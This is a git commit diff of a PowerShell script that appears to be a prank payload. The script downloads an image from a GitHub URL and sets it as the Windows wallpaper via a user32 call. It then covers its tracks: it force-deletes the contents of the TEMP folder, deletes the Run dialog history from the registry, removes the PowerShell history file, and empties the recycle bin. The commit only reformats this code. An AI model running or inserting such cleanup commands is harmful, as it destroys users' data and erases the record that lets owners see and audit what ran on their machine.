577f8106f833ee639879b351e6c5ba1aaf3eebcf
VBV1 <104235290+VBV11@users.noreply.github.com>
2024-02-24 15:33:22 +0100

    BGC.ps1

--- horsd.ps1
+++ horsd.ps1
@@ -1,36 +1,34 @@
-iwr https://raw.githubusercontent.com/VBV11/VBV11/main/EDP.jpeg?dl=1 -O $env:TEMP\horse.jpg
+$picture = "https://raw.githubusercontent.com/VBV11/VBV11/main/EDP.jpeg"
 
-$Image="%TEMP%/horse.jpg"
-$code = @' 
+iwr $picture -OutFile $env:TEMP\horse.jpg
+
+$Image = "$env:TEMP\horse.jpg"
+$code = @'
 using System.Runtime.InteropServices; 
-namespace Win32{ 
+namespace Win32 { 
     
-     public class Wallpaper{ 
+    public class Wallpaper { 
         [DllImport("user32.dll", CharSet=CharSet.Auto)] 
-         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
+        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); 
          
-         public static void SetWallpaper(string thePath){ 
-            SystemParametersInfo(20,0,thePath,3); 
-         }
+        public static void SetWallpaper(string thePath) { 
+            SystemParametersInfo(20, 0, thePath, 3); 
+        }
     }
- } 
+}
 '@
 
-add-type $code 
+Add-Type $code 
 [Win32.Wallpaper]::SetWallpaper($Image)
 
 # Delete contents of Temp folder 
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
 
 # Delete powershell history
+Remove-Item (Get-PSReadlineOption).HistorySavePath
 
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
+# Delete contents of recycle bin
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
